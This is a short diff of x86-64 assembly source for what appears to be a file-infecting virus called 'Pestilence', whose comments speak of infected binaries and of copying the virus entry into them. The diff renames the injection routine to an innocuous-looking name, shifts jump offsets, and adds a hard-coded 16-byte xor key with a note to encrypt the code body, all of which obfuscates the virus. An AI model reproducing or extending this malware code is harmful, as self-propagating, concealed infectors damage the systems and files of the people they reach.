@@ -8,8 +8,6 @@
 ;|                                                                             |
 ;-------------------------------------------------------------------------------
 
-
-
 %include "pestilence.inc"
 
 section.text:
@@ -34,11 +32,11 @@ _params:; filled for infected binaries
 	entry_prg dq 0x0; entry of the prg
 
 _start:
-	call _inject; push addr to stack
+	call _h3ll0w0rld; push addr to stack
 
 signature db `Pestilence version 1.0 (c)oded by lmartin`, 0x0; sw4g signature
 
-_inject:
+_h3ll0w0rld:
 	pop r8; pop addr from stack
 	sub r8, 0x5; sub call instr
 	; r8 contains the entry of the virus (for infected file cpy)
@@ -57,8 +55,14 @@ _inject:
 	syscall
 
 	cmp rax, 0x0
-	jz $+46; has to jmp on [48 31 c0] -> xor rax, rax
+	jz $+64; has to jmp on [48 31 c0] -> xor rax, rax
+	jmp $+18
+	.uwu db `Li\x00fe I\x88s U\x7fwU\xff*`; 16 bytes key ------------<
+	; TODO: crypt somewhere and decrypt there with the key ^ (/w xor ?)
+	; don't forget to update the jmp byte up there
+	.code:
 
+	.here:
 	push 2
 	pop rdi
 	lea rsi, [rel .gandalf + 2]
